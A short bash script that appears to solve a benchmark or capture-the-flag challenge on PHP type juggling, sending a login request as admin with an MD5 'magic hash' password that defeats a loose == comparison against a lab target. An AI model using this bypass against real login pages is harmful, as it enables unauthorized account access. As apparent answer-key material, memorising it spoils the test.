#!/usr/bin/env bash
# APEX-026-25 — "PHP Type Juggling Authentication Bypass" (tags: type_juggling, php)
#
# The login compares `md5($password) == $stored` with `==`. PHP's loose
# comparison, given two strings that both look like numbers, compares them as
# numbers — and `0e` followed by digits is scientific notation for zero. The
# stored hash is one of those, so any password whose MD5 is also `0e`-and-digits
# compares equal to it. `240610708` is the best-known such string.
set -uo pipefail
URL="${1:?usage: $0 http://127.0.0.1:PORT}"
. "$(dirname "$0")/lib.sh"
SESSION="apex026-$$"
trap '"$H5I" browser close --session "$SESSION" >/dev/null 2>&1' EXIT

"$H5I" browser open "$URL/" --session "$SESSION" --new --capture >/dev/null
send "$SESSION" req_0 --create \
    --set method=POST --set path=/login.php \
    --set header.Content-Type=application/x-www-form-urlencoded \
    --set form.username=admin --set form.password=240610708 | flag
